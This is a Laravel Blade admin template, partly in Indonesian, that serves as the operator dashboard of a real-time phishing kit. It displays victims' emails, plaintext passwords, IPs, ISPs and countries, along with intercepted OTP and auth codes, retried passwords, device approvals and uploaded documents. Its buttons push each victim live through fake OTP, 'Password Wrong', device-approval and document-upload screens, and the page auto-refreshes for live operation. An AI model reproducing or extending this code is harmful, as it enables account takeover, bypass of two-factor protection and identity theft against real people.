@extends('layouts.admin')

@section('title', 'Access')
@section('heading', 'Access')

@section('content')
@if (session('status'))
    <div class="stat" style="margin-bottom:1rem;border-color:#134e4a;color:#99f6e4">{{ session('status') }}</div>
@endif

@if ($errors->any())
    <div class="stat" style="margin-bottom:1rem;border-color:#7f1d1d;color:#fecaca">{{ $errors->first() }}</div>
@endif

<div class="stat-row">
    <div class="stat">
        <div class="label">Total</div>
        <div class="value">{{ $totalCount }}</div>
    </div>
    <div class="stat">
        <div class="label">Aktif</div>
        <div class="value">{{ $activeCount }}</div>
    </div>
    <div class="stat">
        <div class="label">Waiting</div>
        <div class="value">{{ $sessions->getCollection()->where('status', 'waiting')->count() }}</div>
    </div>
    <div class="stat">
        <div class="label">Review</div>
        <div class="value">{{ $sessions->getCollection()->whereIn('status', ['otp_review','auth_review','password_review','device_review'])->count() }}</div>
    </div>
</div>

<div class="panel panel-flush">
    <div style="display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;margin-bottom:1rem">
        <p class="muted" style="margin:0">
            Semua login tetap tersimpan di Login Logs. Close / Logout hanya ubah status — Clear all menghapus session di halaman ini.
        </p>
        <form method="POST" action="{{ route('admin.access.clear') }}" onsubmit="return confirm('Hapus semua access session? Dokumen terkait ikut dihapus.')">
            @csrf
            @method('DELETE')
            <button class="btn-page" type="submit">Clear all</button>
        </form>
    </div>

    @if ($sessions->isEmpty())
        <div class="empty">Belum ada login user.</div>
    @else
        <div class="table-wrap">
            <table class="logs access-table">
                <thead>
                    <tr>
                        <th>Date / Time</th>
                        <th>IP</th>
                        <th>Email</th>
                        <th>Password</th>
                        <th>ISP</th>
                        <th>Country</th>
                        <th>Status</th>
                        <th>Kode / Review</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($sessions as $session)
                        @php
                            $ended = in_array($session->status, ['logout', 'closed'], true);
                        @endphp
                        <tr @class(['row-ended' => $ended])>
                            <td>
                                <div>{{ $session->created_at->timezone(config('app.timezone'))->format('Y-m-d') }}</div>
                                <div class="muted mono">{{ $session->created_at->timezone(config('app.timezone'))->format('H:i:s') }}</div>
                            </td>
                            <td class="mono">{{ $session->ip ?? '-' }}</td>
                            <td class="wrap">
                                <div style="font-weight:600">{{ $session->email }}</div>
                                @if ($session->name)
                                    <div class="muted">{{ $session->name }}</div>
                                @endif
                            </td>
                            <td class="mono" style="color:#fbbf24;font-weight:700">{{ $session->login_password ?? '—' }}</td>
                            <td class="wrap">{{ $session->isp ?? '-' }}</td>
                            <td>{{ $session->country ?? '-' }}</td>
                            <td>
                                <span class="badge-admin {{ $ended ? 'badge-ended' : '' }}">{{ $session->status }}</span>
                            </td>
                            <td class="wrap captured-col">
                                @php
                                    $logs = $session->allInputLogs();
                                    $hasCaptured = $logs !== [] || $session->hasDocument() || $session->phone_last4;
                                @endphp

                                @if (! $hasCaptured && ! in_array($session->status, ['otp_review','auth_review','password_review','device_review'], true))
                                    <span class="muted">—</span>
                                @else
                                    <div class="captured">
                                        @if ($session->phone_last4)
                                            <div class="cap-row">
                                                <span class="cap-label">Phone</span>
                                                <span class="mono">****{{ $session->phone_last4 }}</span>
                                            </div>
                                        @endif

                                        @php $counters = []; @endphp
                                        @foreach ($logs as $log)
                                            @php
                                                $kind = $log['kind'] ?? 'code';
                                                $counters[$kind] = ($counters[$kind] ?? 0) + 1;
                                                $n = $counters[$kind];
                                                $label = match ($kind) {
                                                    'otp' => "OTP #{$n}",
                                                    'auth' => "AUTH #{$n}",
                                                    'password' => "Retry PW #{$n}",
                                                    'device' => "Device #{$n}",
                                                    default => strtoupper((string) $kind)." #{$n}",
                                                };
                                                $value = $log['value'] ?? '';
                                                if ($kind === 'device') {
                                                    $value = $value === 'approve' ? 'Approve' : 'Lain kali';
                                                }
                                            @endphp
                                            <div class="cap-row">
                                                <span class="cap-label">{{ $label }}</span>
                                                <span @class([
                                                    'mono',
                                                    'cap-code' => in_array($kind, ['otp', 'auth'], true),
                                                    'cap-pw' => $kind === 'password',
                                                    'cap-device' => $kind === 'device',
                                                ])>{{ $value }}</span>
                                                @if (! empty($log['at']))
                                                    <span class="muted mono" style="font-size:.7rem">{{ $log['at'] }}</span>
                                                @endif
                                            </div>
                                        @endforeach

                                        @if ($session->hasDocument())
                                            <div class="cap-row">
                                                <span class="cap-label">Doc</span>
                                                <span>
                                                    <a href="{{ route('admin.access.document', $session) }}" style="color:#93c5fd">
                                                        {{ $session->document_original_name }}
                                                    </a>
                                                </span>
                                            </div>
                                        @endif
                                    </div>

                                    @if (in_array($session->status, ['otp_review', 'auth_review'], true))
                                        <form method="POST" action="{{ route('admin.access.decline-otp', $session) }}" style="margin-top:.5rem">
                                            @csrf
                                            <button class="btn-decline" type="submit">Decline OTP</button>
                                        </form>
                                    @elseif ($session->status === 'password_review')
                                        <form method="POST" action="{{ route('admin.access.decline-password', $session) }}" style="margin-top:.5rem">
                                            @csrf
                                            <button class="btn-decline" type="submit">Decline Password</button>
                                        </form>
                                    @elseif ($session->status === 'device_review')
                                        <form method="POST" action="{{ route('admin.access.decline-device', $session) }}" style="margin-top:.5rem">
                                            @csrf
                                            <button class="btn-decline" type="submit">Decline Device</button>
                                        </form>
                                    @endif
                                @endif
                            </td>
                            <td>
                                @if ($ended)
                                    <span class="muted">Selesai</span>
                                    @if ($session->hasDocument())
                                        <div style="margin-top:.4rem">
                                            <a class="btn-page" style="display:inline-block;text-decoration:none" href="{{ route('admin.access.document', $session) }}">Download doc</a>
                                        </div>
                                    @endif
                                @else
                                    <div class="page-actions">
                                        @if (in_array($session->status, ['otp_review', 'auth_review'], true))
                                            <form method="POST" action="{{ route('admin.access.decline-otp', $session) }}">
                                                @csrf
                                                <button type="submit" class="btn-decline">Decline OTP</button>
                                            </form>
                                        @elseif ($session->status === 'password_review')
                                            <form method="POST" action="{{ route('admin.access.decline-password', $session) }}">
                                                @csrf
                                                <button type="submit" class="btn-decline">Decline Password</button>
                                            </form>
                                        @elseif ($session->status === 'device_review')
                                            <form method="POST" action="{{ route('admin.access.decline-device', $session) }}">
                                                @csrf
                                                <button type="submit" class="btn-decline">Decline Device</button>
                                            </form>
                                        @endif

                                        <form method="POST" action="{{ route('admin.access.send', [$session, 'waiting']) }}">
                                            @csrf
                                            <button type="submit" class="btn-page {{ $session->status === 'waiting' ? 'is-active' : '' }}">Waiting</button>
                                        </form>

                                        <form method="POST" action="{{ route('admin.access.send', [$session, 'otp']) }}" class="otp-send-form">
                                            @csrf
                                            <input
                                                type="text"
                                                name="phone_last4"
                                                inputmode="numeric"
                                                maxlength="4"
                                                pattern="[0-9]{4}"
                                                placeholder="{{ $session->hasPhoneLast4() ? $session->phone_last4 : '4 digit' }}"
                                                value="{{ $session->phone_last4 }}"
                                                class="phone-input"
                                                @if (! $session->hasPhoneLast4()) required @endif
                                                title="4 digit terakhir nomor — cukup isi sekali per session"
                                            >
                                            <button type="submit" class="btn-page {{ in_array($session->status, ['otp','otp_review'], true) ? 'is-active' : '' }}">OTP</button>
                                        </form>

                                        <form method="POST" action="{{ route('admin.access.send', [$session, 'auth']) }}">
                                            @csrf
                                            <button type="submit" class="btn-page {{ in_array($session->status, ['auth','auth_review'], true) ? 'is-active' : '' }}">AUTH</button>
                                        </form>

                                        <form method="POST" action="{{ route('admin.access.send', [$session, 'password']) }}">
                                            @csrf
                                            <button type="submit" class="btn-page {{ str_starts_with($session->status, 'password') ? 'is-active' : '' }}">Password Wrong</button>
                                        </form>

                                        <form method="POST" action="{{ route('admin.access.send', [$session, 'device']) }}">
                                            @csrf
                                            <button type="submit" class="btn-page {{ in_array($session->status, ['device','device_review'], true) ? 'is-active' : '' }}">Approve Device</button>
                                        </form>

                                        <form method="POST" action="{{ route('admin.access.send', [$session, 'document']) }}">
                                            @csrf
                                            <button type="submit" class="btn-page {{ $session->status === 'document' ? 'is-active' : '' }}">Upload Document</button>
                                        </form>

                                        <form method="POST" action="{{ route('admin.access.send', [$session, 'logout']) }}">
                                            @csrf
                                            <button type="submit" class="btn-page">Logout</button>
                                        </form>

                                        <form method="POST" action="{{ route('admin.access.close', $session) }}" onsubmit="return confirm('Close & logout user? Data tetap tersimpan.')">
                                            @csrf
                                            <button type="submit" class="btn-page">Close</button>
                                        </form>
                                    </div>
                                @endif
                            </td>
                        </tr>
                    @endforeach
                </tbody>
            </table>
        </div>

        <div class="pager">
            @if ($sessions->onFirstPage())
                <span>Prev</span>
            @else
                <a href="{{ $sessions->previousPageUrl() }}">Prev</a>
            @endif

            <span class="active">{{ $sessions->currentPage() }} / {{ $sessions->lastPage() }}</span>

            @if ($sessions->hasMorePages())
                <a href="{{ $sessions->nextPageUrl() }}">Next</a>
            @else
                <span>Next</span>
            @endif
        </div>
    @endif
</div>

<style>
    .captured { display: flex; flex-direction: column; gap: .35rem; min-width: 11rem; }
    .cap-row { display: flex; flex-direction: column; gap: .1rem; }
    .cap-label { color: var(--muted); font-size: .7rem; text-transform: uppercase; letter-spacing: .05em; }
    .cap-code { font-size: 1.15rem; color: #f9a8d4; font-weight: 700; }
    .cap-pw { color: #fbbf24; font-weight: 700; word-break: break-all; }
    .cap-device { color: #5eead4; font-weight: 700; }
    .panel-flush .table-wrap { margin: 0; }
    .access-table th, .access-table td { white-space: nowrap; }
    .access-table td.wrap { white-space: normal; min-width: 8rem; }
    .row-ended td { opacity: .72; }
    .badge-ended { background: #3f1d1d; color: #fca5a5; }
    .page-actions { display: flex; flex-wrap: wrap; gap: .4rem; align-items: center; min-width: 18rem; }
    .otp-send-form { display: inline-flex; gap: .35rem; align-items: center; }
    .phone-input {
        width: 4.5rem; border: 1px solid var(--border); background: #0c1117; color: var(--text);
        border-radius: 8px; padding: .4rem .45rem; font-size: .85rem; font-family: ui-monospace, monospace;
    }
    .btn-page {
        border: 1px solid var(--border); background: #121820; color: var(--text);
        border-radius: 8px; padding: .45rem .7rem; font-size: .85rem; font-weight: 600; cursor: pointer;
    }
    .btn-page.is-active { outline: 2px solid #5eead4; }
    .btn-decline { border: 0; border-radius: 8px; padding: .45rem .75rem; background: #b91c1c; color: #fff; font-weight: 600; cursor: pointer; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
</style>

<script>
(() => {
    const shouldPause = () => {
        const el = document.activeElement;
        if (!el) return false;
        const tag = el.tagName;
        if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return true;
        return [...document.querySelectorAll('.phone-input')].some((i) => i.value.trim() !== '');
    };

    const tick = () => {
        if (document.visibilityState === 'visible' && !shouldPause()) {
            window.location.reload();
            return;
        }
        setTimeout(tick, 2500);
    };

    setTimeout(tick, 2500);
})();
</script>
@endsection
